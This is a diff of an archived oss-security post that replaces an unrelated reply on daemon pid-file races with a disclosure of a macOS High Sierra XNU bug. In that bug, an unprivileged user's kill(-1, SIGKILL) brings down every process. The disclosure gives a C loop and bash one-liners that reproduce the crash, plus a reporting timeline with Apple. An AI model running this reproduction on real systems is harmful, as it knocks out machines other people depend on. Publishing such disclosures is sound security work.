@@ -1,57 +1,108 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/09/07/9
-Message-ID: <20170907203811.bnzbtjq4c56cgxgw@perpetual.pseudorandom.co.uk>
-Date: Thu, 7 Sep 2017 21:38:11 +0100
-From: Simon McVittie <smcv@...ian.org>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/10/12/1
+Message-ID: <87h8v5b2rf.fsf@xps13.shealevy.com>
+Date: Wed, 11 Oct 2017 20:58:44 -0400
+From: Shea Levy <shea@...alevy.com>
 To: oss-security@...ts.openwall.com
-Subject: Re: CVE-2017-12847: nagios-core privilege escalation via PID file manipulation
+Cc: Rob Vermaas <rob.vermaas@...il.com>
+Subject: Privilege escalation with kill(-1, SIGKILL) in XNU kernel of macOS High Sierra
 Content-Type: text/plain; charset=utf-8
 
-On Thu, 07 Sep 2017 at 12:29:50 -0400, Daniel Kahn Gillmor wrote:
-> On Thu 2017-09-07 16:27:25 +0100, Simon McVittie wrote:
-> > Ideally, the sequence of events would be something that ensures that
-> > the pid file already exists by the time readiness has been announced,
-> > like this pseudocode:
-> >
-> >     have the necessary privileges to write a pid file
-> >     fork
-> >     if (parent) {
-> >         write child pid to pid file
-> >         exit    /* tells supervisor we are ready */
-> >     }
-> >     else /* child */ {
-> >         drop privileges
-> >         while (1) { process request }
-> >     }
-> 
-> Is there a potential race condition here?  for example, if dropping
-> privileges takes some amount of time, or if there is additional setup
-> that ought to be done as non-root (building tables, pre-processing a
-> dataset from the filesystem, initializing a PRNG), then this pattern is
-> actually pretty hard to get right as a notification.
+Hello oss-security,
 
-I was assuming a structure a bit like dbus-daemon, which calls bind()
-and listen() while still privileged before forking. It does do some
-additional setup as non-root after dropping privileges, but if a
-client connects during that window, the client's socket will just block
-for a short time (whether that means actually blocking or EAGAIN is up
-to the client), until the dbus-daemon is ready to enter its main loop.
-It won't get ECONNREFUSED, because the socket is already listening
-(assuming the socket backlog is sufficiently long to accommodate all the
-clients).
+We have found an issue in the XNU kernel of macOS High Sierra wherein an
+unprivileged user can terminate all running processes using the kill
+system call. In short, a completely unprivileged user can bring down the
+entire system with kill(-1, SIGKILL) (and, in a shell, kill SIGKILL -1),
+so long as there is at least one other process running owned by that
+user. In some cases we've seen it take a few tries in a loop to actually
+trigger the issue.
 
-The daemon doesn't need to be ready to actually do its work before
-forking, only ready to take responsibility for keeping clients waiting
-until it *is* ready.
+We have reported the issue to Apple, who do not see it as a security
+concern. On its own the ability to easily bring down a multi-user system
+is concerning, but the fact that we found this accidentally and that the
+behavior is exactly what you'd expect if there were no permissions check
+for the kill call at all leads us to believe that there is likely more
+that can be done to exploit this issue. Some reports include log
+messages showing services being killed prior to the system breaking,
+though this has been difficult to reproduce.
 
->  0) if dropping privs is known to be fast, then move any lengthy
->     initialization/setup into the root/pre-fork side.  this is a
->     violation of the principle of least privilege.
+We have not reserved a CVE for this issue as Apple is a CNA and does not
+see it as a security issue.
 
-Arguably yes, but putting a minimal amount of setup before forking closes
-the race condition, and some of that setup is probably going to need
-privileges anyway (for example web servers that want to listen on port
-80, or dbus-daemon --system which wants to listen on the root-owned
-/var/run/dbus/system_bus_socket).
+Reproduction, C:
 
-    S
+test.c:
+
+#include <unistd.h>
+#include <sys/syscall.h>
+#include <signal.h>
+#include <errno.h>
+#include <string.h>
+#include <stdio.h>
+
+int main() {
+  int result;
+
+  for (int i = 0; i < 200; i++) {
+    result = kill(-1, SIGKILL); // Also fails with `syscall(SYS_kill, -1, SIGKILL, 0);`
+    printf("result:%i,errno:%i (%s)\n", result, errno, strerror(errno));
+  }
+}
+
+$ gcc test.c
+$ sudo -i
+# /usr/bin/sysadminctl -addUser -fullName "Kill Test User" -home /var/empty -addUser killtest
+# cd /
+# while true; do sudo -u killtest /bin/sh -c “sleep 1 & ./a.out”; done
+
+This may take a few minutes to break your system.
+
+Reproduction, Bash:
+
+$ sudo /usr/bin/sysadminctl -addUser -fullName "Kill Test User" -home /var/empty -addUser killtest
+$ while true; do sudo -u killtest /bin/sh -c “sleep 1 & kill -kill -1”; done
+
+This may take a few minutes to break your system.
+
+Background and history:
+
+On darwin, the Nix package manager [1] uses
+syscall(SYS_kill, -1, SIGKILL, 0) to kill all processes running as a
+build user after the build completes, to ensure no stray processes are
+left around by the (partially untrusted) build script. The normal
+kill(2) interface on darwin isn't used because it also kills the calling
+process, making it difficult for the parent to distinguish a successful
+call to kill all processes from a rogue builder killing off the killing
+process itself.
+
+On 2017/09/28 at 4 AM Eastern, Matthew Bauer opened bug NixOS/nix#1583
+[2] on the Nix github issue tracker, showing a system lockup on High
+Sierra. Originally this was chalked up to changes with APFS, but by 9 PM
+Eastern Matthew traced it down to the SYS_kill call with a
+self-contained reproduction [3]. At around 10:50 PM Eastern, I realized
+this was not just a bug in Nix but likely signified a privilege
+escalation in the kernel. I wasn't able to get in contact with anyone
+trusted who was running High Sierra until I got back in contact with
+Matthew around 11:40, and together we verified the symptoms did in fact
+indicate privilege escalation. By that point I had access to a High
+Sierra machine myself, and walked through the steps we had outlined to
+reproduce the issue. I reported the issue the Apple Product Security and
+the NixOS security team that night. I synced up with the NixOS security
+team the next morning, and worked in consultation with them through the
+rest of this process. On 2017/10/03 at 10:33 AM Pacific, Apple Product
+Security responded that they were not able to see security implications
+in the issue. On 2017/10/05, Daniel Peebles verified that the issue can
+even be triggered with the normal kill libc call, and the kill
+program. We sent Apple a draft of this disclosure, including the updated
+information about the ease of triggering, and they declined to treat it
+as a vulnerability.
+
+Regards,
+Shea Levy
+
+[1]: https://nixos.org/nix
+[2]: https://github.com/NixOS/nix/issues/1583
+[3]: https://github.com/NixOS/nix/issues/1583#issuecomment-333002658
+
+Download attachment "signature.asc" of type "application/pgp-signature" (833 bytes)
